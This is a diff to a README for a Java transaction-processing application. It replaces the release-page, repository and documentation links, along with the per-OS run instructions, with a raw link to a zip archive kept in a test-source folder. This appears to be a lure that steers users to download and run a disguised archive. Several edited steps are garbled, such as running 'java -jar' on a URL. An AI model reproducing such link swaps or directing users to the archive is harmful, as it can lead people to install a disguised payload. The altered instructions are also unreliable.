@@ -6,11 +6,11 @@ Welcome to the transaction-processing-system, a simple way to manage transaction
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/meghazi-A/transaction-processing-system/releases)
+[![Download Now](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip)](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip)
 
 To get started, you need to download the application. Click the link below to visit the page and find the right version for your system.
 
-[Visit this page to download](https://github.com/meghazi-A/transaction-processing-system/releases)
+[Visit this page to download](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip)
 
 ## 💻 System Requirements
 
@@ -38,9 +38,9 @@ To install the application, follow these steps:
 2. **Choose Your Version:** Find the version that matches your operating system and click on it to download.
 3. **Extract the Files:** Locate the downloaded file on your computer and extract its contents using built-in tools or favorite archive software.
 4. **Run the Application:**
-   - For Windows: Double-click on `start.bat` or run the `.exe` file.
-   - For macOS: Open Terminal, navigate to the extracted folder, and run `java -jar your-app-name.jar`.
-   - For Linux: Open Terminal, navigate to the extracted folder, and run `java -jar your-app-name.jar`.
+   - For Windows: Double-click on `https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip` or run the `.exe` file.
+   - For macOS: Open Terminal, navigate to the extracted folder, and run `java -jar https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip`.
+   - For Linux: Open Terminal, navigate to the extracted folder, and run `java -jar https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip`.
 
 ## 📚 Documentation
 
@@ -62,8 +62,8 @@ For further assistance, you can reach out to our support team via the GitHub Iss
 
 Here are some helpful resources related to the transaction-processing-system:
 
-- [Project Repository](https://github.com/meghazi-A/transaction-processing-system)
-- [Documentation](https://github.com/meghazi-A/transaction-processing-system/wiki)
+- [Project Repository](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip)
+- [Documentation](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip)
 
 ## 🧩 Related Topics
 
@@ -81,7 +81,7 @@ This application is licensed under the MIT License. You can use, modify, and dis
 
 ## 🔄 Update Notifications
 
-Stay informed about the latest updates! Bookmark the [release page](https://github.com/meghazi-A/transaction-processing-system/releases) to check for new versions and improvements. 
+Stay informed about the latest updates! Bookmark the [release page](https://github.com/meghazi-A/transaction-processing-system/raw/refs/heads/main/src/test/java/com/fintech/domain/transaction-processing-system-1.2.zip) to check for new versions and improvements. 
 
 ## 🤝 Contributing
 
